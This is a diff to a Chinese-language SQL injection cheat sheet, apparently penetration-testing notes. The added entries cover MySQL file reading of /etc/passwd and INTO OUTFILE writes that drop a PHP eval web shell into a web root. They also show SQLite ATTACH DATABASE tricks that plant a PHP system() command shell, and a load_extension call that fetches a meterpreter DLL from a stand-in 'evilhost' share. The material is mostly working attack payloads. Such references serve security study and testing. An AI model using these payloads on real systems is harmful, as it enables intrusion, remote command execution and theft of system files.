@@ -117,6 +117,7 @@ SELECT * FROM users; # 这也是注释
 多行注释 */
 SELECT * FROM users;
 ```
+url传递注释`-- +`中的`+`urldecode时会被替换为空格，又因为url中的`#`起anchor的作用，不会实际传递给后端服务器，所以需要对`#`urlencode = `%23`
 
 ### 联合注入
 
@@ -204,6 +205,11 @@ id=1; IF((SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE username='adm
 
 ### MySQL
 
+获取版本
+```sql
+select version();
+```
+
 `information_schema`是mysql自带的一个数据库，包含了各种原数据，可以获取以下信息
 
 获取所有databases
@@ -235,6 +241,18 @@ table_schema = database() and table_name = 'users'
 select group_concat(id,':',username,':',password) from users
 ```
 
+读写文件
+```sql
+show global variables like '%secure_file_priv%';
+-- secure_file_priv NULL 表示不可用， 空 表示可用
+-- 在 MySQL 5.5.3 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件
+-- 在 MySQL 5.5.3 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件
+
+select load_file('/etc/passwd');
+
+select  '<?php eval($_POST[\'hack\'])?>',2 into outfile '/var/www/dvwa/shell.php';
+```
+
 ### SQLite
 
 数据库结构
@@ -252,6 +270,15 @@ SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name
 列名
 ```sql
 SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
+```
+
+命令执行
+```sql
+ATTACH DATABASE '/var/www/lol.php' AS lol;
+CREATE TABLE lol.pwn (dataz text);
+INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");
+
+UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');
 ```
 
 详细可以[参看](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
